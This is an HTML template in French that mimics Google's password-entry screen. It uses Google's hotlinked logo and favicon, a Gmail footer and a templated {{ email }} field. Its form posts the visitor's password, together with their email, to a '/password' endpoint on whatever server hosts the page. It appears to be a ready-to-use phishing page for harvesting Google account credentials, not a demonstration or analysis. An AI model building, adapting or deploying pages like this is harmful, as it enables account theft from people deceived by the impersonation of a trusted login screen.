<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Saisissez votre mot de passe - Google</title>
    <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
    <style>
        body {
            font-family: Roboto, Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
        }

        .login-container {
            max-width: 400px;
            margin: 60px auto;
            background-color: #fff;
            padding: 30px 40px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 75px;
        }

        h2 {
            text-align: center;
            font-weight: normal;
            color: #202124;
        }

        input[type="password"] {
            width: 100%;
            padding: 12px 10px;
            margin: 12px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }

        .btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }

        .btn:hover {
            background-color: #155db2;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            color: #777;
            font-size: 12px;
        }

        .email-display {
            font-size: 14px;
            color: #555;
            margin-bottom: 10px;
            text-align: center;
        }

        @media (max-width: 500px) {
            .login-container {
                margin: 30px 15px;
                padding: 20px;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google" class="logo">
        <h2>Saisissez votre mot de passe</h2>

        <div class="email-display">{{ email }}</div>

        <form method="POST" action="/password">
            <input type="hidden" name="email" value="{{ email }}">
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit" class="btn">Suivant</button>
        </form>
    </div>

    <div class="footer">
        Gmail 
    </div>

</body>
</html>
